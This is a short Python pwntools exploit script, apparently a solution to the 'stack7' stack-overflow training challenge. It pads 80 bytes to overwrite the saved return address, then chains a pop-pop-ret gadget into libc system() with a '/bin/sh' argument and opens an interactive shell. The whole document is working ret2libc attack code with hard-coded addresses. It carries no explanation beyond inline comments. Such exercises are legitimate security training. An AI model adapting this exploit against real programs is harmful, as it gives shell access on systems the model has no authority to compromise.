#!/usr/bin/env python3
from pwn import *

# ——————————————————————————————————————————————————————————————
#  CONFIGURATION
# ——————————————————————————————————————————————————————————————

context.binary = elf = ELF('./stack7', checksec=False)
context.log_level = 'info'      # change to 'debug' for full trace
context.arch      = 'i386'
context.os        = 'linux'

# these addresses were taken from your local `ldd ./stack7` + debugger
POP_POP_RET = 0x08048492       # gadget: pop ebx; pop ebp; ret
SYSTEM     = 0xf7db2220        # libc system()
BINSH      = 0xf7f26e52        # "/bin/sh" string in libc

OFFSET = 80                     # number of bytes to EIP overwrite

# ——————————————————————————————————————————————————————————————
#  BUILD PAYLOAD
# ——————————————————————————————————————————————————————————————

payload = flat(
    b'A'*OFFSET,                # pad to saved EIP
    POP_POP_RET,                # pop ebx; pop ebp; ret
    0xdeadbeef,                 # filler → ebx
    0xcafebabe,                 # filler → ebp
    SYSTEM,                     # next RET → system()
    0x41414141,                 # fake return address after system()
    BINSH                       # argument → "/bin/sh"
)

# ——————————————————————————————————————————————————————————————
#  EXPLOIT
# ——————————————————————————————————————————————————————————————

io = process(elf.path)
io.sendlineafter(b"input path please:", payload)
io.interactive()
